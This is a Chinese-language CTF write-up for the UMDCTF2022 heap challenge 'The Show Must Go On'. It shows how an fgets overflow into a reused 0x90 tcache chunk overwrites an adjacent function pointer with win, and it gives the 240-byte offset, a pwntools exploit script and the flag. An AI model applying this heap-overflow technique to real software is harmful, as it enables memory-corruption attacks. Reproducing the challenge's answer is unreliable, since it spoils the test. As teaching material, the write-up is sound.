# UMDCTF2022 The Show Must Go On Writeup

## 题目简述

程序维护一个带函数指针的演出结构体：

```c
typedef struct Act {
    char name[0x20];
    char actCode[0x40];
    void (*performAct)();
} Act;
```

初始化阶段先申请并释放若干堆块，再根据用户给出的长度申请演出描述，却固定用 `fgets(..., 500, ...)` 写入。目标是利用堆溢出覆盖相邻 `Act.performAct`，把它改为程序中的 `win`。

## 解题过程

关键分配顺序为：

```c
message1 = malloc_set(0x50);
message2 = malloc_set(0x60);
message3 = malloc_set(0x80);

mainAct = malloc_set(sizeof(Act));

free(message1);
free(message3);

showDescription = malloc_set(descLen + 8);
fgets(showDescription, 500, stdin);
```

在 64 位 glibc 中，`malloc(0x80)` 对应大小为 `0x90` 的 chunk。输入 `descLen = 128` 后，请求大小为 `128 + 8 = 0x88`，同样落入 `0x90` 大小类，因此 `showDescription` 会复用刚释放的 `message3`。

`message3` 原本紧邻之后分配的 `mainAct`。从复用块的用户区起点到 `mainAct` 用户区相距 `0x90` 字节，而函数指针位于 `Act` 内偏移 `0x20 + 0x40 = 0x60`，故总偏移为：

$$
0x90 + 0x60 = 0xf0 = 240
$$

官方利用脚本据此构造：

```python
exe = context.binary = ELF("./tcache2")

payload = cyclic(240) + p64(exe.sym["win"])

io.sendlineafter(b"act?", b"blah")
io.sendlineafter(b"be?", b"128")
io.sendlineafter(b"us:", payload)
io.sendlineafter(b"Action:", b"1")
```

菜单动作 1 会执行：

```c
currentAct->performAct();
```

函数指针已经变成 `win`，程序读取并打印 `flag.txt`：

```text
UMDCTF{b1ns_cAN_B3_5up3r_f4st}
```

## 方法总结

题名虽然提示 tcache，但这里无需伪造链表指针。关键是让新申请精确复用已释放的 `0x90` chunk，再利用越界写覆盖物理相邻对象。分析这类题时，应分别计算“请求大小到 chunk 大小的归一化”和“目标字段相对当前用户区的总距离”，不能只看源码中的数组长度。
